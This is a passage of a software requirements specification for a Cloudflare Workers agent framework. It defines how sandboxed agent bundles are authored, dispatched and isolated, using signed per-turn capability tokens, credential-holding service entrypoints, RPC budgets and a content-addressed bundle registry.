## ADDED Requirements

<!-- Section: Bundle authoring and runtime -->

### Requirement: Bundle authoring API and BundleEnv constraint

The system SHALL provide a `defineBundleAgent<BundleEnv>(setup)` function exported from `@crabbykit/agent-bundle/bundle` that accepts a setup object describing the agent's brain (`model`, `prompt`, `tools`, `capabilities`, optional `metadata`) and returns a bundle descriptor whose default export is a fetch handler. The system SHALL export a `BundleEnv` type constraint that excludes Cloudflare native binding types (`Ai`, `R2Bucket`, `DurableObjectNamespace`, `WorkerLoader`, `VectorizeIndex`, `D1Database`); only `Service<T>` service bindings and structurally-serializable values (strings, numbers, booleans, plain objects) SHALL be assignable to a type extending `BundleEnv`. A bundle's `model` function SHALL NOT accept an `apiKey` field — provider credentials are resolved host-side via LlmService.

#### Scenario: Minimal bundle authoring
- **WHEN** a developer writes `export default defineBundleAgent({ model: () => ({ provider: "openrouter", modelId: "anthropic/claude-sonnet-4" }), prompt: { agentName: "Helper" } })`
- **THEN** the compiled bundle loads in a Worker Loader isolate and produces a brain that answers prompts via the host LlmService

#### Scenario: Service binding allowed in BundleEnv
- **WHEN** a bundle declares `interface MyEnv extends BundleEnv { LLM: Service<LlmService>; TIMEZONE: string }`
- **THEN** the bundle type-checks and runs with `env.LLM` and `env.TIMEZONE` accessible

#### Scenario: Native binding rejected at compile time
- **WHEN** a bundle declares `interface MyEnv extends BundleEnv { AI: Ai }`
- **THEN** TypeScript emits a type error identifying `Ai` as not assignable

#### Scenario: apiKey rejected at compile time
- **WHEN** a bundle declares `model: () => ({ provider: "openrouter", modelId: "...", apiKey: "sk-..." })`
- **THEN** TypeScript rejects the `apiKey` field at compile time

### Requirement: Bundle default-export contract

A compiled bundle's default export SHALL be a fetch handler discriminating on URL path with these endpoints: `POST /turn` (handle a prompt turn, returning `AsyncIterable<AgentEvent>` as a `ReadableStream` body), `POST /client-event` (handle an incoming WebSocket message routed from the host DO), `POST /alarm` (handle an alarm fire), `POST /session-created` (handle session initialization), `POST /smoke` (load-time smoke test for `bundle_deploy` pre-deploy verification), `POST /metadata` (return declared bundle metadata as JSON). The fetch handler SHALL construct the bundle's small async runtime per invocation, dispatching to the appropriate runtime method based on the URL path.

#### Scenario: Host invokes bundle for a turn
- **WHEN** the host DO calls `worker.getEntrypoint().fetch(new Request("https://bundle/turn", {method: "POST", body: JSON.stringify({prompt})}))`
- **THEN** the bundle constructs its async runtime with spine-backed adapter clients reading the capability token from `env.__SPINE_TOKEN`, runs the turn, and returns a `ReadableStream` of agent events the host DO consumes

#### Scenario: Smoke endpoint responds without state
- **WHEN** the workshop calls `POST /smoke` against a candidate bundle in a scratch loader isolate with a synthetic token
- **THEN** the bundle returns a well-formed response indicating it loads and dispatches correctly, without requiring a real session store

#### Scenario: Metadata endpoint returns declared identity
- **WHEN** the workshop calls `POST /metadata` after building a bundle that declared `metadata: { name: "Helper", description: "research assistant" }`
- **THEN** the bundle returns the declared JSON metadata object; if no metadata was declared, returns an empty object

### Requirement: Bundle runtime is async-by-default and stateless across turns

The bundle's small runtime SHALL use async interfaces throughout (`SessionStoreClient`, `KvStoreClient`, `SchedulerClient`, `SessionChannel`). The runtime SHALL NOT hold per-session state across turn invocations — every turn rebuilds whatever it needs from the verified token-derived identity and from spine-fetched session context. The bundle's `SessionChannel` interface SHALL be send-only (`broadcast`, `broadcastGlobal` methods only); the interface SHALL NOT expose `onMessage` / `onClose` / `onOpen` callback registration. Incoming client events arrive at the bundle via the `POST /client-event` endpoint, not via the SessionChannel. Capability hooks running inside a bundle SHALL receive a hook context whose state-touching surfaces are async; this bundle-side hook context type SHALL be distinct from the static-agent `CapabilityHookContext`.

#### Scenario: Stateless across turns
- **WHEN** a bundle handles two consecutive turns in the same loader isolate (warm cache hit)
- **THEN** the second turn does not depend on any in-memory state from the first turn; both rebuild context via spine RPC

#### Scenario: Send-only channel enforced
- **WHEN** bundle code attempts to register `channel.onMessage(...)` against the SessionChannel
- **THEN** the SessionChannel type does not declare `onMessage`; the code fails to type-check

#### Scenario: Bundle hook awaits sessionStore
- **WHEN** a bundle capability's `beforeInference` hook calls `await ctx.sessionStore.getEntries({ limit: 10 })`
- **THEN** the call resolves via spine RPC and returns the entries

### Requirement: Bundle subpath export boundary

The `@crabbykit/agent-bundle` package SHALL physically separate bundle-authoring exports from host-side exports via `package.json` `exports` rules. The bundle-authoring entry (`/bundle`) SHALL NOT re-export `LlmService`, `SpineService`, or any host-side WorkerEntrypoint class. The host entry (`/host`) SHALL NOT re-export `defineBundleAgent` or the bundle-side runtime. Importing host-side symbols from the bundle entry SHALL fail at module resolution.

#### Scenario: Host-side import blocked from bundle entry
- **WHEN** a bundle file imports `LlmService` from `@crabbykit/agent-bundle/bundle`
- **THEN** module resolution fails because `LlmService` is not exported from that subpath

<!-- Section: Bundle dispatch on the host -->

### Requirement: Optional bundle config field on defineAgent

`defineAgent<TEnv>` SHALL accept an optional `bundle` config field on its setup object. When omitted, the produced DO class SHALL behave identically to today's static agent — same code paths, same dependencies, no new runtime checks, no new wrangler bindings required. When provided, the produced DO class SHALL gain the ability to dispatch turns into a registry-backed bundle while still serving the static brain whenever no bundle is active. The optional `bundle` config SHALL accept `{ registry, loader, authKey, bundleEnv }` factory functions.

#### Scenario: Static agent unaffected
- **WHEN** a developer writes `defineAgent({ model, prompt, tools, capabilities })` without the `bundle` field
- **THEN** the produced DO class is identical to today's behavior — no new code paths exercised, no new dependencies pulled in, no overhead

#### Scenario: Bundle-enabled agent declared
- **WHEN** a developer writes `defineAgent({ model, prompt, tools, capabilities, bundle: { registry, loader, authKey, bundleEnv } })`
- **THEN** the produced DO class exposes the same external API but additionally checks the registry for an active bundle on each turn dispatch

#### Scenario: Mixed static and bundle-enabled agents in one worker
- **WHEN** a worker exports two `defineAgent`-created classes — one with `bundle` config, one without — registered as separate DO classes
- **THEN** both run correctly with no interference; the static-only agent exhibits no overhead from the bundle-enabled agent's existence

### Requirement: Static brain is the always-available fallback

When `bundle` config is enabled, the static fields (`model`, `prompt`, `tools`, `capabilities`) on `defineAgent` SHALL still be required. They define the agent's static brain, which (a) runs whenever no active bundle is registered for this agent, and (b) automatically takes over when an active bundle becomes inactive (via manual disable, automatic poison-bundle revert, or registry pointer cleared). There SHALL NOT be a separate "fallback bundle" config; the static fields are the fallback. The static brain SHALL NOT require any bundle infrastructure to run — it uses the existing static `AgentRuntime`.

#### Scenario: No bundle registered, static brain runs
- **WHEN** a turn arrives at a bundle-enabled agent whose registry has no active version for this agent
- **THEN** the dispatcher runs the static `AgentRuntime` path with the statically-declared `model`, `prompt`, `tools`, `capabilities` — exactly as a pure static agent would

#### Scenario: Bundle disabled mid-life, static brain takes over
- **WHEN** an active bundle is in use and `bundle_disable` is called (or auto-revert triggers)
- **THEN** the registry's `active_version_id` becomes NULL and the next turn runs the static brain

### Requirement: Per-turn dispatch check with capability token minting

For each turn invocation, the bundle-enabled DO SHALL perform a dispatch check at the top of `handleTurn`: read the active bundle version ID from `ctx.storage` (or fall through to a registry query if absent). If a version is set, the DO SHALL mint a fresh HMAC-signed capability token bound to `{aid: agentId, sid: sessionId, exp: now + ttlMs, nonce}` (default `ttlMs = 5 minutes`), invoke Worker Loader with the bundle bytes from KV keyed by version ID, project the bundle env (with the token under `__SPINE_TOKEN`), and dispatch the turn into the bundle's `POST /turn` endpoint. If no version is set, the DO SHALL run the static `AgentRuntime` path. The dispatch check SHALL be at most a `ctx.storage.get` on the warm path. The DO SHALL NOT reuse tokens across turns. Per-service HKDF subkeys SHALL be derived from the master `AGENT_AUTH_KEY` at host startup and distributed to each service `WorkerEntrypoint` env separately; the master key SHALL only be held by the DO.

#### Scenario: Warm dispatch with active bundle
- **WHEN** a turn arrives at a bundle-enabled agent whose `ctx.storage.activeBundleVersionId` is set and whose Worker Loader cache contains the version
- **THEN** the dispatcher mints a fresh token, invokes the loader (cache hit, factory does not run), forwards the turn into the bundle, consumes the bundle's response stream, and persists/forwards events via the DO's existing `SessionStore` and `Transport`

#### Scenario: Cold dispatch with active bundle
- **WHEN** a turn arrives and the loader cache has been evicted for the active version
- **THEN** the dispatcher invokes the loader, the factory fetches bundle bytes from KV by version ID, the loader compiles and caches, the turn proceeds

#### Scenario: Token minted with verified identity
- **WHEN** the DO dispatches a turn for `agentId=A`, `sessionId=S`
- **THEN** the minted token's verified payload contains `aid=A`, `sid=S`, `exp` in the future, and a unique nonce; the token is injected into the bundle env under `__SPINE_TOKEN`

#### Scenario: HKDF subkeys distributed
- **WHEN** the host worker starts up with `AGENT_AUTH_KEY` configured
- **THEN** each `WorkerEntrypoint` (`SpineService`, `LlmService`, `TavilyService`, ...) holds only its own HKDF-derived verify-only subkey, computed via `HKDF(AGENT_AUTH_KEY, "claw/<service>-v1")`; the master key is never directly exposed to any service entrypoint

### Requirement: Bundle replaces static brain entirely for one turn

When a turn dispatches into a bundle, the bundle's brain (model, prompt, tools, capabilities, hook chain) SHALL entirely replace the static brain for the duration of that turn. The static brain's capabilities SHALL be dormant; only the bundle's capabilities run. Cost emission, tool execution, and state operations from the bundle SHALL use the bundle's runtime, not the static `AgentRuntime`.

#### Scenario: Bundle capabilities only
- **WHEN** a turn dispatches into a bundle whose `capabilities` include `compactionSummary` and the static agent's capabilities also include `compactionSummary`
- **THEN** only the bundle's `compactionSummary` runs during this turn; the static agent's instance is not invoked

### Requirement: Active version cached in DO storage

The bundle-enabled DO SHALL cache its current active bundle version ID in `ctx.storage.activeBundleVersionId` to avoid querying the registry on every turn. The cache SHALL be updated by deploy and rollback operations via a method the workshop calls when the registry pointer changes. Reading the active version on the warm path SHALL be a `ctx.storage.get` call. Falling through to a registry query SHALL only happen on cold start or after a cache miss.

#### Scenario: Warm turn bypasses registry
- **WHEN** the DO's `ctx.storage` already contains an `activeBundleVersionId`
- **THEN** no D1 query is issued during turn dispatch

#### Scenario: Deploy updates cached pointer
- **WHEN** the workshop's `bundle_deploy` succeeds for this agent
- **THEN** the workshop signals the target DO via RPC, and the DO updates its `ctx.storage.activeBundleVersionId` before the next turn begins

### Requirement: Auto-revert on consecutive load failures

If a bundle that was registered as active fails to load (loader factory throws, smoke check on load fails, bundle's `/turn` endpoint returns a load-time error) on N consecutive turns (default N=3), the dispatcher SHALL automatically clear the active version pointer in the registry, log a poison-bundle deployment row with rationale `"auto-revert: poison bundle"`, and run the static brain on the failing turn. The DO's `ctx.storage.activeBundleVersionId` SHALL be cleared.

#### Scenario: Three consecutive load failures revert
- **WHEN** a deployed bundle has crashed during load on the previous two turns and crashes again on the third turn
- **THEN** the dispatcher clears the active version pointer, logs an auto-revert entry, and runs the static brain to complete this turn

### Requirement: bundleEnv projection by host

The host `bundle.bundleEnv` factory SHALL be the exclusive source of bundle env values. The DO SHALL pass the projected env (plus the minted `__SPINE_TOKEN` injected by the dispatcher) as the `env` field of the loader factory return value. Native bindings NOT explicitly projected through service binding stubs SHALL NOT appear in the bundle env. The DO SHALL validate the projection's serializability before invoking the loader; non-serializable values trigger fallback to the static brain and log a configuration error.

#### Scenario: Service binding projected
- **WHEN** the host declares `bundleEnv: (env) => ({ LLM: env.LLM_SERVICE, TIMEZONE: "UTC" })`
- **THEN** the loaded bundle sees `{ LLM, TIMEZONE, __SPINE_TOKEN }` in its env and has no access to other host bindings

#### Scenario: Native binding projection rejected
- **WHEN** the host declares `bundleEnv: (env) => ({ AI: env.AI })` with `env.AI` being the raw Workers AI binding
- **THEN** the dispatcher catches the projection failure (DataCloneError) and falls back to the static brain, logging the configuration error

### Requirement: Steer/abort routing across loader boundary

The DO SHALL retain ownership of WebSocket connections and in-flight turn tracking. When a client message arrives via WebSocket while a bundle turn is in flight, the DO SHALL deliver the message to the bundle by calling `POST /client-event` on the bundle's default export with the message and a fresh capability token. Abort messages SHALL cancel the DO's consumption of the bundle's response `ReadableStream`, propagating cancellation to the bundle isolate.

#### Scenario: Steer delivered to in-flight bundle turn
- **WHEN** a steer message arrives via WebSocket while a bundle's `handleTurn` is in flight
- **THEN** the DO calls `POST /client-event` on the same bundle (same loader cache key), delivering the steer; the bundle's runtime adjusts the in-flight inference loop

#### Scenario: Abort cancels bundle stream
- **WHEN** an abort message arrives via WebSocket while a bundle turn is in flight
- **THEN** the DO cancels its consumption of the bundle's response `ReadableStream`, which propagates cancellation to the bundle isolate

### Requirement: Per-entry bundle version tagging stamped by DO

Session entries created during turns dispatched through a bundle-enabled agent SHALL be tagged with the brain identity that produced them: `bundleVersionId: <hash>` for bundle-produced entries or `bundleVersionId: "static"` for static-brain-produced entries. The DO SHALL stamp this tag at append time, NOT the bundle, so a malicious bundle cannot forge the tag. The tag SHALL be persisted in the entry's metadata.

#### Scenario: Bundle-produced entry tagged
- **WHEN** a turn runs against bundle version `abc123` and produces an assistant message entry
- **THEN** the entry's metadata includes `bundleVersionId: "abc123"`, stamped by the DO before persistence

#### Scenario: Static-produced entry tagged
- **WHEN** a turn runs without an active bundle
- **THEN** entries produced by that turn carry `bundleVersionId: "static"`

### Requirement: Out-of-band bundle disable HTTP endpoint

Bundle-enabled DOs SHALL expose an HTTP endpoint at `POST /bundle/disable` that, when called by an authenticated operator, clears the agent's active bundle pointer and forces the static brain on the next turn. The endpoint SHALL be authenticated via the existing `agent-auth` mechanism. The endpoint SHALL be implemented at the DO level (NOT routed through the bundle), so a broken bundle cannot disable its own recovery path. The DO SHALL reserve all `/bundle/*` paths and never forward them to a bundle.

#### Scenario: Privileged operator disables a bundle
- **WHEN** an authenticated operator sends `POST /bundle/disable` to a DO whose active bundle is broken
- **THEN** the DO clears its `ctx.storage.activeBundleVersionId`, calls `registry.setActive(agentId, null)`, logs a deployment entry with rationale `"out-of-band disable"`, and the next turn runs the static brain

#### Scenario: Unauthenticated disable rejected
- **WHEN** an unauthenticated request hits `POST /bundle/disable`
- **THEN** the DO returns 401 without modifying state

<!-- Section: SpineService bridge -->

### Requirement: SpineService WorkerEntrypoint

The bundle-enabled DO's host worker SHALL expose a `SpineService` class extending `WorkerEntrypoint`, exported from `@crabbykit/agent-bundle/host`, that bridges between the bundle's async adapter clients and the DO's existing sync `SessionStore`, `KvStore`, `Scheduler`, and `Transport`. The class SHALL hold its HKDF-derived verify-only subkey in its own env and SHALL NOT have access to the master `AGENT_AUTH_KEY`. The DO's existing sync interfaces SHALL NOT change as part of adding this bridge.

#### Scenario: SpineService registered and callable
- **WHEN** a host worker exports `class SpineService extends WorkerEntrypoint` and declares a service binding `{ binding: "SPINE", service: "host", entrypoint: "SpineService" }`
- **THEN** code in another isolate that receives `env.SPINE` as a service binding can invoke its methods via JSRPC

### Requirement: Per-turn capability token verification on every spine method

Every method on `SpineService` (other than internal lifecycle methods) SHALL take a sealed capability token as its first argument and verify it via constant-time HMAC against its HKDF-derived verify-only subkey before performing any operation. Verification SHALL reject (a) tokens with invalid signatures, (b) tokens whose `expiresAt` is in the past, (c) tokens whose nonce has already been consumed (single-use enforcement). Identity for all session-scoped operations SHALL be derived from the verified token payload only. Method signatures SHALL NOT accept `sessionId` or `agentId` as caller-supplied arguments.

#### Scenario: Valid token accepted
- **WHEN** a bundle calls `env.SPINE.appendEntry(token, entry)` with a valid token whose nonce has not been consumed
- **THEN** the spine extracts `agentId` and `sessionId` from the verified payload, persists the entry under that session via the DO's existing sync `sessionStore`, and marks the nonce consumed

#### Scenario: Tampered token rejected
- **WHEN** a bundle calls any spine method with a token whose payload bytes have been modified after signing
- **THEN** the HMAC verification fails, the method returns `ERR_BAD_TOKEN`, and no state change occurs

#### Scenario: Expired token rejected
- **WHEN** a bundle calls any spine method with a token whose `expiresAt` is in the past
- **THEN** the method returns `ERR_TOKEN_EXPIRED` and no state change occurs

#### Scenario: Replayed token rejected
- **WHEN** a bundle calls any spine method twice with the same token nonce
- **THEN** the second call returns `ERR_TOKEN_REPLAY`

#### Scenario: Method signature audit
- **WHEN** an auditor reads `SpineService` method signatures
- **THEN** no method takes a `sessionId`, `agentId`, or capability-namespace key as an argument that bypasses the token-derived identity

### Requirement: SpineService session, KV, scheduler, transport-out, and cost RPC surfaces

`SpineService` SHALL expose the following async methods, each taking a token as the first argument and deriving session/agent identity from the verified token:

- **Session store**: `appendEntry(token, entry)`, `getEntries(token, options)`, `getSession(token)`, `createSession(token, init)`, `listSessions(token, filter)`, `buildContext(token)`, `getCompactionCheckpoint(token)`
- **KV store**: `kvGet(token, capabilityId, key)`, `kvPut(token, capabilityId, key, value, options?)`, `kvDelete(token, capabilityId, key)`, `kvList(token, capabilityId, prefix)`
- **Scheduler**: `scheduleCreate(token, schedule)`, `scheduleUpdate(token, scheduleId, patch)`, `scheduleDelete(token, scheduleId)`, `scheduleList(token)`, `alarmSet(token, timestamp)`
- **Transport-out (send-only)**: `broadcast(token, event)`, `broadcastGlobal(token, event)`
- **Cost emission**: `emitCost(token, costEvent)` where `costEvent` includes `capabilityId`, `toolName`, `amount`, `currency`, optional `detail`/`metadata` but SHALL NOT include `sessionId`

Each method SHALL bridge to the DO's existing sync `SessionStore` / `KvStore` / `Scheduler` / `Transport` / cost emission flow. All arguments and return values SHALL be JSON-serializable; binary data SHALL be passed as `ReadableStream` or `ArrayBuffer`. Functions, closures, and Durable Object stubs (other than the spine itself) SHALL NOT appear in any RPC method signature. There SHALL NOT be any incoming-message-callback registration on the spine — client events route via the bundle's `POST /client-event` endpoint, not via spine RPC.

#### Scenario: Bundle appends entry via spine bridge
- **WHEN** a bundle calls `await env.SPINE.appendEntry(token, entry)` with a token whose `sid="session-1"`
- **THEN** SpineService verifies the token, gets the agent DO stub, calls the DO's existing sync `sessionStore.appendEntry("session-1", entry)`, and returns

#### Scenario: Bundle cannot write to a session it does not own
- **WHEN** a bundle holds a valid token for `sessionId: "session-A"` and attempts to construct a separate token for `sessionId: "session-B"`
- **THEN** there is no method signature that accepts a target sessionId; the bundle has no path to write into `session-B`

#### Scenario: Bundle streams agent event to client
- **WHEN** a bundle calls `env.SPINE.broadcast(token, event)`
- **THEN** all WebSocket clients subscribed to the token's session receive the event in real time via the DO's existing transport

#### Scenario: Capability service emits cost
- **WHEN** a capability service class calls `env.SPINE.emitCost(token, { capabilityId: "tavily", toolName: "search", amount: 0.01, currency: "USD" })` after a successful API call
- **THEN** the cost is persisted as a custom session entry of type `cost` keyed to the token's sessionId, and broadcast as a `cost_event`

#### Scenario: Cost cannot target a foreign session
- **WHEN** a bundle attempts to emit a cost with metadata referencing a sessionId other than the one in its token
- **THEN** there is no method signature accepting a target sessionId; only the token's verified sessionId is used

### Requirement: Per-turn RPC budget enforcement in spine

`SpineService` SHALL enforce per-token RPC budgets to prevent denial-of-service from inside a single bundle's turn. Default budgets per token: 100 SQL ops, 50 KV ops, 200 broadcast events, 5 alarm sets. Budgets SHALL be configurable via host worker config. Exceeding any budget SHALL return `ERR_BUDGET_EXCEEDED`. Budget counters SHALL be tracked atomically (per-token in-isolate counter or DO-storage transactional increment) so parallel RPCs cannot race past the limit.

#### Scenario: Budget enforced atomically
- **WHEN** a bundle calls `appendEntry(token, ...)` 101 times in parallel within a single turn
- **THEN** at most 100 succeed; the others return `ERR_BUDGET_EXCEEDED`

<!-- Section: LlmService -->

### Requirement: LlmService is the exclusive path to provider credentials

The system SHALL provide an `LlmService` class extending `WorkerEntrypoint`, exported from `@crabbykit/agent-bundle/host`. `LlmService` SHALL be the **only** mechanism by which a bundle reaches a credentialed LLM provider. The class SHALL hold provider credentials (`OPENROUTER_API_KEY`, `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, the native `AI` binding for Workers AI) and its HKDF-derived verify-only subkey in its own env. The class SHALL expose `infer(token, request)` that bundles invoke via service binding. Provider credentials SHALL NOT be accessible via `bundleEnv`, return values, error messages, or stack traces. Without `LlmService`, bundles SHALL have no path to call frontier-model providers — by design, this enforces the "secrets never in bundles" invariant for provider keys.

#### Scenario: Host registers LlmService
- **WHEN** a host worker exports `class LlmService extends WorkerEntrypoint` and declares a service binding `{ binding: "LLM_SERVICE", service: "host", entrypoint: "LlmService" }`
- **THEN** bundles that receive `env.LLM_SERVICE` can call `env.LLM_SERVICE.infer(token, request)` via JSRPC

#### Scenario: Bundle has no other path to providers
- **WHEN** a bundle attempts to import an LLM SDK (`import OpenAI from "openai"`) or call `fetch("https://api.openrouter.ai/...")` directly
- **THEN** the bundle has no API key in any reachable form (provider keys are not in `BundleEnv`, native `fetch` is restricted by `globalOutbound: null` per security hardening), so no credentialed call is possible

### Requirement: LlmService multi-provider routing with token verification

`LlmService.infer(token, request)` SHALL take a sealed capability token as its first argument and verify it via the shared verification utility before any provider call. Identity (agentId, sessionId) for budget enforcement, cost attribution, and audit SHALL be derived from the verified token payload, NOT from any field in `request`. `LlmService.infer` SHALL accept a request with at least `{ provider, modelId, messages, tools?, stream? }` and route based on the `provider` discriminator. Supported providers SHALL include at minimum `openrouter`, `anthropic`, `openai`, and `workers-ai`. Unknown providers SHALL return a structured error without leaking credential state.

#### Scenario: Valid token routes to correct provider
- **WHEN** a bundle calls `env.LLM_SERVICE.infer(token, { provider: "openrouter", modelId: "anthropic/claude-sonnet-4", messages: [...] })` with a valid token
- **THEN** the service verifies the token, derives agentId/sessionId, uses `this.env.OPENROUTER_API_KEY` to call OpenRouter, returns the response, and emits a cost event keyed to the verified session

#### Scenario: Workers AI request routed to native binding
- **WHEN** a bundle calls `infer(token, { provider: "workers-ai", modelId: "@cf/meta/llama-3.1-8b-instruct", messages: [...] })`
- **THEN** the service uses `this.env.AI.run(...)` and returns the response

#### Scenario: Bad token rejected before any provider call
- **WHEN** a bundle calls `infer(badToken, ...)` with a token whose HMAC fails verification
- **THEN** the service returns `ERR_BAD_TOKEN` without making any upstream call and without exposing any credential or internal state

#### Scenario: Unknown provider returns sanitized error
- **WHEN** a bundle calls `infer(token, { provider: "fake", modelId: "...", messages: [...] })`
- **THEN** the service returns a structured error identifying the provider as unsupported, with no reference to other provider credentials, key names, or internal state

### Requirement: LlmService rate limiting, cost emission, streaming, tool calls

`LlmService` SHALL enforce per-agent inference rate limits keyed on the verified token's `agentId` (default 100 calls/minute per agent). Exceeding the limit SHALL return `ERR_RATE_LIMITED`. After every successful inference call, `LlmService` SHALL emit a cost event via `env.SPINE.emitCost(token, ...)` attributed to the token-derived agentId/sessionId. `LlmService.infer` SHALL support tool-call requests and streaming responses; streaming responses SHALL be returned as `ReadableStream` values across the JSRPC boundary. The bundle's small runtime SHALL provide a `ServiceLlmProvider` adapter that implements the bundle runtime's LLM provider interface by RPCing through `env.LLM_SERVICE` with the bundle's `__SPINE_TOKEN`; when a bundle's `model()` returns `{ provider, modelId }` without `apiKey`, the runtime SHALL use this adapter automatically.

#### Scenario: Rate limit enforced
- **WHEN** a bundle's agent issues 101 inference calls within one minute (same agentId in token)
- **THEN** the 101st call returns `ERR_RATE_LIMITED`

#### Scenario: Successful inference emits cost
- **WHEN** an `infer` call completes successfully
- **THEN** before the result returns, `LlmService` calls `env.SPINE.emitCost(token, { capabilityId: "llm-service", toolName: "infer", amount, currency })` with the same token

#### Scenario: Streaming response across RPC
- **WHEN** a bundle issues `infer(token, { ..., stream: true })`
- **THEN** the service returns a `ReadableStream` from which the bundle reads content deltas in order

#### Scenario: Tool call round-trip
- **WHEN** a bundle issues an inference request with tool schemas and the model responds with a tool call
- **THEN** the service returns the tool-call response in a structure equivalent to direct provider calls; the bundle submits the tool result back via a follow-up `infer` call

<!-- Section: Capability service pattern -->

### Requirement: Four-subpath export convention for secret-holding capabilities

Capability packages that hold secrets SHALL expose four subpath exports: `index` (legacy static-agent factory, unchanged for backwards compatibility), `service` (host-side `WorkerEntrypoint` class holding credentials), `client` (bundle-side capability factory taking `Service<T>`), `schemas` (shared tool schemas with content hash for drift detection). Package `exports` in `package.json` SHALL physically enforce the separation. The `client` module SHALL NOT import from the `service` module. Capability packages without secrets SHALL follow a two-subpath pattern (`index` for static, `bundle` for bundles) sharing logic via a private internal module. The legacy `index` export SHALL continue to function identically for static-agent consumers; splitting a package SHALL NOT require any change to existing static consumers.

#### Scenario: Tavily exposes four subpaths
- **WHEN** a developer imports from `@crabbykit/tavily-web-search`, `.../service`, `.../client`, and `.../schemas`
- **THEN** each import resolves to a distinct module: legacy `tavilyWebSearch({apiKey})`, `TavilyService` WorkerEntrypoint, `tavilyClient({service})` factory, and shared schemas

#### Scenario: Client module does not import service
- **WHEN** static analysis of `client.ts` enumerates its imports
- **THEN** no import path resolves to `./service` or `./service.js`

#### Scenario: compaction-summary exposes two subpaths
- **WHEN** a developer imports `compactionSummary` from `@crabbykit/compaction-summary` (static path) or `compactionSummaryBundle` from `@crabbykit/compaction-summary/bundle`
- **THEN** each import resolves to a factory appropriate for its host runtime; both share their LLM-call logic via a private internal module

#### Scenario: Static agent using tavilyWebSearch unaffected
- **WHEN** a pre-existing static agent imports `tavilyWebSearch` from the legacy entry and instantiates it with an API key
- **THEN** the agent builds, runs, and executes Tavily tools with exactly the same behavior as before the package split

### Requirement: Capability service holds credentials, verifies tokens, emits costs, sanitizes errors

Capability service classes SHALL be the exclusive holders of capability credentials within their package. Credentials SHALL be read from `this.env` and SHALL NOT be passed to, returned from, or referenced by any other subpath of the same package. Every method on a capability service class SHALL take a sealed capability token as its first argument and verify it via the shared verification utility against the service's HKDF-derived verify-only subkey. Identity for cost attribution SHALL be derived from the verified token payload, NOT from other arguments. Errors raised by upstream API calls SHALL be sanitized — only a whitelisted error code and generic message SHALL cross the RPC boundary; the upstream response body and JS exception stack trace SHALL NOT cross. Service methods SHALL emit cost events via `env.SPINE.emitCost(token, costEvent)` (where `costEvent` does NOT include sessionId) before returning success, so cost emission cannot be suppressed by the bundle.

#### Scenario: Service method verifies token
- **WHEN** a bundle's client calls `env.TAVILY.search(token, { query: "cats" })` with a valid token
- **THEN** the service verifies the token, derives the sessionId, calls Tavily, emits a cost event keyed to the verified session, and returns the result

#### Scenario: Bad token rejected before external call
- **WHEN** a bundle's client calls `env.TAVILY.search(badToken, ...)` with a tampered token
- **THEN** the service returns `ERR_BAD_TOKEN` without making any external Tavily call

#### Scenario: Upstream errors sanitized
- **WHEN** an upstream Tavily call returns an error containing the credential in an echoed authorization header
- **THEN** the service catches the error and returns `ERR_UPSTREAM_OTHER` with a generic message; no upstream response body crosses the RPC boundary

#### Scenario: Cost is unsuppressable by bundle
- **WHEN** a bundle attempts to short-circuit a cost by never awaiting the service result
- **THEN** the cost has already been persisted via spine RPC prior to the result returning; the cost entry remains in the session store

### Requirement: Static schemas shared between service and client with drift detection

Tool names, descriptions, and parameter schemas for a split capability SHALL be declared in a `schemas.ts` module exported via the `schemas` subpath. Both `service.ts` and `client.ts` SHALL import their tool schemas from this shared module. The shared module SHALL also export a content hash both sides can compare at RPC time to detect cross-version drift. Schema hash mismatch SHALL be a defensive consistency check that surfaces drift early; the service SHALL still validate incoming arguments against its own schema independently using TypeBox Check.

#### Scenario: Schema change propagates to both sides
- **WHEN** a developer updates the `search` tool's parameter schema in the shared schemas file
- **THEN** both the service implementation and the client capability factory type-check against the new schema; any inconsistency is caught at compile time

#### Scenario: Cross-version drift detected at runtime
- **WHEN** a bundle built against schemas v1 runs against a service built against schemas v2 with incompatible parameters
- **THEN** the schema hash mismatch is detected on the first RPC call and the service returns `ERR_SCHEMA_VERSION` instead of attempting the call

### Requirement: Bundle-side client proxies tools via RPC with token from env

The bundle-side `client.ts` capability factory SHALL produce a capability whose tool `execute` functions are thin RPC proxies that read the bundle's capability token from `env.__SPINE_TOKEN` and call corresponding methods on the service binding. Execution arguments SHALL be passed verbatim (subject to RPC serializability). The token SHALL come from the bundle env, NOT from any tool argument the LLM can forge. The client SHALL NOT cache or persist the token across turns. The client SHALL NOT implement business logic beyond RPC marshaling.

#### Scenario: Client tool RPCs to service
- **WHEN** a bundle's agent calls a client tool like `tavily_search({ query: "cats" })`
- **THEN** the client's execute reads the token from the bundle env and issues `await env.TAVILY.search(token, { query: "cats" })`, returning the service's result wrapped in the standard tool result shape

#### Scenario: Token from env, not arguments
- **WHEN** the client's tool execute runs with LLM-supplied arguments that include a token-shaped value
- **THEN** the LLM-supplied value is ignored; the RPC call's first argument is `env.__SPINE_TOKEN`

<!-- Section: Bundle registry -->

### Requirement: BundleRegistry interface and content-addressed version IDs

The system SHALL provide a `BundleRegistry` interface with methods for bundle version creation, active-version pointer management, deployment audit logging, version listing, and bundle bytes operations: `createVersion`, `getVersion`, `getActiveForAgent`, `setActive`, `rollback`, `listDeployments`, `putBytes`, `getBytes`. A D1-backed reference implementation (`D1BundleRegistry`) SHALL ship as the default in `packages/bundle-registry`. The interface SHALL support an `InMemoryBundleRegistry` implementation for unit testing. Bundle version IDs SHALL be SHA-256 hashes (hex-encoded) of compiled bundle artifact bytes; two identical artifacts SHALL produce the same version ID. The version ID SHALL be both the KV key suffix (`bundle:{versionId}`) and the Worker Loader cache key. Two agents deploying the same bundle content SHALL share the same version ID, KV entry, and Worker Loader cache slot.

#### Scenario: Deterministic version ID
- **WHEN** the same artifact bytes are hashed twice
- **THEN** both hashes produce the identical version ID string

#### Scenario: Version ID reuse across agents
- **WHEN** two agents deploy the same bundle content
- **THEN** they share the same version ID, the same KV entry, and the same Worker Loader cache slot

#### Scenario: Registry contract implementable
- **WHEN** a developer writes an `InMemoryBundleRegistry` that implements the `BundleRegistry` interface
- **THEN** the class satisfies the TypeScript interface and can be passed to `defineAgent`'s `bundle.registry` factory

### Requirement: D1 schema with self-seeding migration

`D1BundleRegistry` SHALL self-seed its schema on first use by running CREATE TABLE IF NOT EXISTS statements for `bundle_versions`, `agent_bundles`, and `bundle_deployments` tables plus required indexes. The schema migration SHALL follow the pattern established by `packages/skill-registry`. Schemas:

